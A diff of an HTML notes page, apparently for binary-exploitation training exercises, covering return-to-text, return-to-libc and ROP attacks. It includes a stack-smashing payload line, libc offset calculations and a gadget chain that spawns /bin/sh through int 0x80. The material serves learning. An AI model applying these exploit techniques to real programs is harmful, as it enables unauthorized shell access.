@@ -54,74 +54,111 @@
             <div class="section" id="foo-4">
 <h2>foo_4</h2>
 <p>Training for &quot;return to text&quot; attack.</p>
-<p>binsh: 0x0804a030
-system: 0x080483e0</p>
-<p><tt class="docutils literal">print <span class="pre">'a'*24</span> + '\xe0\x83\x04\x08' + 'aaaa' + '\x20\x86\x04\x08'</tt></p>
+<ul class="simple">
+<li>binsh: 0x0804a030</li>
+<li>system: 0x080483e0</li>
+<li><tt class="docutils literal">print <span class="pre">'a'*24</span> + '\xe0\x83\x04\x08' + 'aaaa' + '\x20\x86\x04\x08'</tt></li>
+</ul>
 </div>
 <div class="section" id="foo-5">
 <h2>foo_5</h2>
 <p>Training for &quot;return to libc&quot; attack.</p>
 <p>Notice: libc.so is provided</p>
-<p><tt class="docutils literal">$ objdump <span class="pre">-d</span> libc.so</tt>
-00019970 &lt;__libc_start_main&gt;:
-0003fc40 &lt;__libc_system&gt;:
-offset: 262d0</p>
+<ul>
+<li><dl class="first docutils">
+<dt><tt class="docutils literal">$ objdump <span class="pre">-d</span> libc.so</tt></dt>
+<dd><ul class="first last">
+<li><p class="first">00019970 &lt;__libc_start_main&gt;:</p>
+</li>
+<li><dl class="first docutils">
+<dt>0003fc40 &lt;__libc_system&gt;:</dt>
+<dd><ul class="first last simple">
+<li>offset: 262d0</li>
+</ul>
+</dd>
+</dl>
+</li>
+</ul>
+</dd>
+</dl>
+</li>
+</ul>
 <p>Example:
 Function: libc_start_main's address is :  0xf75f5970
 Function: libc_system's address is : 0xf75f5970 + 0x262d0 = 0xf761bc40</p>
-<p><tt class="docutils literal">$ objdump <span class="pre">-R</span> foo_5</tt>
-0804a01c R_386_JUMP_SLOT   __libc_start_main</p>
-<p>0804a02c &lt;binsh&gt;:
-actual address: 08048620</p>
+<ul>
+<li><dl class="first docutils">
+<dt><tt class="docutils literal">$ objdump <span class="pre">-R</span> foo_5</tt></dt>
+<dd><ul class="first last simple">
+<li>0804a01c R_386_JUMP_SLOT   __libc_start_main</li>
+</ul>
+</dd>
+</dl>
+</li>
+<li><dl class="first docutils">
+<dt>0804a02c &lt;binsh&gt;:</dt>
+<dd><ul class="first last simple">
+<li>actual address: 08048620</li>
+</ul>
+</dd>
+</dl>
+</li>
+</ul>
 </div>
 <div class="section" id="foo-6">
 <h2>foo_6</h2>
 <p>Training for &quot;return-oriented programming&quot; attack.</p>
-<p>int 0x80
-eax: call what
-ebx, ecx: arguments
-remember the number of pops, smash the stack</p>
+<ul class="simple">
+<li>int 0x80</li>
+<li>eax: call what</li>
+<li>ebx, ecx: arguments</li>
+<li>remember the number of pops, smash the stack</li>
+</ul>
 <div class="section" id="gadget-1">
 <h3>Gadget 1</h3>
-<p>first gadget: 0x080594ac
-reset eax to 0 by XOR itself
-value for <tt class="docutils literal">pop ebx</tt>: 0x080be568 (/bin/sh)
-return address of first gadget: 0x0805cc5c</p>
-<div class="highlight"><pre>80594ac:       31 c0                   xor    eax,eax
-80594ae:       5b                      pop    ebx
-80594af:       c3                      ret
+<ul class="simple">
+<li>first gadget: 0x080594ac</li>
+<li>reset eax to 0 by XOR itself</li>
+<li>value for <tt class="docutils literal">pop ebx</tt>: 0x080be568 (/bin/sh)</li>
+<li>return address of first gadget: 0x0805cc5c</li>
+</ul>
+<div class="highlight"><pre><span class="err">80594</span><span class="nl">ac:</span>       <span class="err">31</span> <span class="nf">c0</span>                   <span class="nv">xor</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
+<span class="err">80594</span><span class="nl">ae:</span>       <span class="err">5</span><span class="nf">b</span>                      <span class="nv">pop</span>    <span class="nb">ebx</span>
+<span class="err">80594</span><span class="nl">af:</span>       <span class="nf">c3</span>                      <span class="nv">ret</span>
 </pre></div>
 </div>
 <div class="section" id="gadget-2">
 <h3>Gadget 2</h3>
-<p>second gadget: 0x0805cc5c
-garbage value for <tt class="docutils literal">pop edi</tt>: aaaa
-return address of second gadget: 0x0805cc5c
-repeat 11 times to make eax = 0x0000000b
-last return address of second gadget: 0x0806f0e0</p>
-<div class="highlight"><pre>805cc5c:       40                      inc    eax
-805cc5d:       5f                      pop    edi
-805cc5e:       c3                      ret
+<ul class="simple">
+<li>second gadget: 0x0805cc5c</li>
+<li>garbage value for <tt class="docutils literal">pop edi</tt>: aaaa</li>
+<li>return address of second gadget: 0x0805cc5c</li>
+<li>repeat 11 times to make eax = 0x0000000b</li>
+<li>last return address of second gadget: 0x0806f0e0</li>
+</ul>
+<div class="highlight"><pre><span class="err">805</span><span class="nl">cc5c:</span>       <span class="err">40</span>                      <span class="nf">inc</span>    <span class="nb">eax</span>
+<span class="err">805</span><span class="nl">cc5d:</span>       <span class="err">5</span><span class="nf">f</span>                      <span class="nv">pop</span>    <span class="nb">edi</span>
+<span class="err">805</span><span class="nl">cc5e:</span>       <span class="nf">c3</span>                      <span class="nv">ret</span>
 </pre></div>
 </div>
 <div class="section" id="gadget-3">
 <h3>Gadget 3</h3>
 <p>third gadget: 0x0806f0e0</p>
-<div class="highlight"><pre>806f0e0:       cd 80                   int    0x80
-806f0e2:       c3                      ret
+<div class="highlight"><pre><span class="err">806</span><span class="nl">f0e0:</span>       <span class="nf">cd</span> <span class="mi">80</span>                   <span class="nv">int</span>    <span class="mh">0x80</span>
+<span class="err">806</span><span class="nl">f0e2:</span>       <span class="nf">c3</span>                      <span class="nv">ret</span>
 </pre></div>
 </div>
 <div class="section" id="failed-gadget">
 <h3>Failed Gadget</h3>
 <p>Program received signal SIGSEGV in 0x080db8ce. Still don't know why :(</p>
-<div class="highlight"><pre>80db8cd:       40                      inc    eax
-80db8ce:       02 af 0a 0e 0c 41       add    ch,BYTE PTR [edi+0x410c0e0a]
-80db8d4:       c3                      ret
+<div class="highlight"><pre><span class="err">80</span><span class="nl">db8cd:</span>       <span class="err">40</span>                      <span class="nf">inc</span>    <span class="nb">eax</span>
+<span class="err">80</span><span class="nl">db8ce:</span>       <span class="err">02</span> <span class="nf">af</span> <span class="mi">0</span><span class="nv">a</span> <span class="mi">0</span><span class="nv">e</span> <span class="mi">0</span><span class="nv">c</span> <span class="mi">41</span>       <span class="nv">add</span>    <span class="nb">ch</span><span class="p">,</span><span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">edi</span><span class="o">+</span><span class="mh">0x410c0e0a</span><span class="p">]</span>
+<span class="err">80</span><span class="nl">db8d4:</span>       <span class="nf">c3</span>                      <span class="nv">ret</span>
 </pre></div>
 <p>Cannot use <tt class="docutils literal">pop eax</tt> because 0x0000000b contains 00 which is null. It will
 terminate the input string unexpectedly.</p>
-<div class="highlight"><pre>80e205d:  58                      pop    eax
-80e205e:  c3                      ret
+<div class="highlight"><pre><span class="err">80</span><span class="nl">e205d:</span>  <span class="err">58</span>                      <span class="nf">pop</span>    <span class="nb">eax</span>
+<span class="err">80</span><span class="nl">e205e:</span>  <span class="nf">c3</span>                      <span class="nv">ret</span>
 </pre></div>
 </div>
 </div>
